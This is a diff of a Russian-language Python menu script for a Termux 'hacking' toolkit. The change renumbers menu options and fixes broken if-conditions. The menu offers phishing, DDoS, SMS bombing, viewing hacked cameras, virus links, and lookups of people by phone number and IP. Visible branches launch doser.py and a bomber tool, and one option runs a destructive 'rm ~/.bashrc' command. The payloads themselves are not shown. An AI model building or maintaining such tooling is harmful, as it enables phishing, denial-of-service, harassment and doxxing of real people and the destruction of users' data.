@@ -18,15 +18,15 @@ while True:
     print ("\n")
     print ("[telegram: @SYPEXHACK]                       [v2.6.0]")
     res()
-    print (Fore.YELLOW+"    [01] тунелирование <ngrok>")
-    print (Fore.YELLOW+"    [02] тунелирование <localhost>")
-    print (Fore.YELLOW+"    [03] фишинг")
-    print (Fore.YELLOW+"    [04] ддос")
-    print (Fore.YELLOW+"    [05] бомбер <мини>")
-    print (Fore.YELLOW+"    [06] приветствие")
-    print (Fore.YELLOW+"    [07] заблокировать Termux")
-    print (Fore.YELLOW+"    [08] просмотр взломаных камер")
-    print (Fore.YELLOW+"    [09] вирус ссылка")
+    print (Fore.YELLOW+"    [1] тунелирование <ngrok>")
+    print (Fore.YELLOW+"    [2] тунелирование <localhost>")
+    print (Fore.YELLOW+"    [3] фишинг")
+    print (Fore.YELLOW+"    [4] ддос")
+    print (Fore.YELLOW+"    [5] бомбер <мини>")
+    print (Fore.YELLOW+"    [6] приветствие")
+    print (Fore.YELLOW+"    [7] заблокировать Termux")
+    print (Fore.YELLOW+"    [8] просмотр взломаных камер")
+    print (Fore.YELLOW+"    [9] вирус ссылка")
     print (Fore.YELLOW+"    [10] замаскировать фишинг")
     print (Fore.YELLOW+"    [11] пробив по номеру")
     print (Fore.YELLOW+"    [12] пробив по ip")
@@ -57,7 +57,7 @@ while True:
         os.system('python3 fail.py')
        
        
-    if inp == '1' or '01':
+    if inp == '1':
         print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
         tru_101 = input('\n Включили? [y/n] >>> ')
         os.system('clear')
@@ -102,7 +102,7 @@ while True:
             os.system('clear')
      
 
-    if inp == '2' or '02':
+    if inp == '2':
         os.system('clear')
         print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
         tru_201 = input('\n Включили? [y/n] >>> ')
@@ -167,7 +167,7 @@ while True:
 
 
 
-    if inp == '3' or '03':
+    if inp == '3':
         os.system('clear')
         print('['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+' ПЕРЕД ЗАПУСКОМ ВКЛЮИТЕ ТОЧКУ ДОСТУПА И МОБ ИНТЕРНЕТ]')
         tru_301 = input('\n Включили? [y/n] >>> ')
@@ -190,7 +190,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '4' or '04':
+    if inp == '4':
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка ддос...")
         res()
         time.sleep(1.5)
@@ -211,7 +211,7 @@ while True:
         os.system('python doser.py && python3 tool.py')
 
 
-    if inp == '5' or '05':
+    if inp == '5':
         os.system('clear')
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка бомбер...")
         res()
@@ -223,7 +223,7 @@ while True:
         os.system('bomber')
 
 
-    if inp == '6' or '06':
+    if inp == '6':
         tt = 'привет'
         os.system('clear')
         os.system('rm ~/.bashrc')
@@ -279,7 +279,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '7' or '07':
+    if inp == '7':
         os.system('clear')
         print(Fore.RED+'[ВЫ УВЕРЕНЫ ЧТО ХОТИТЕ ЗАБЛОКИРОВАТЬ Termux?]')
         res()
@@ -299,7 +299,7 @@ while True:
             os.system('clear')
 
 
-    if inp == '8' or '08':
+    if inp == '8':
         print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка взломаных камер...")
         res()
         time.sleep(1.5)
@@ -315,7 +315,7 @@ while True:
         tsu_801 = input('[нажмите entr чтобы выйти]')
 
 
-    if inp == '9' or '09':
+    if inp == '9':
         os.system('clear')
         print(Fore.GREEN+'[Генерируется ссылка...]')
         res()
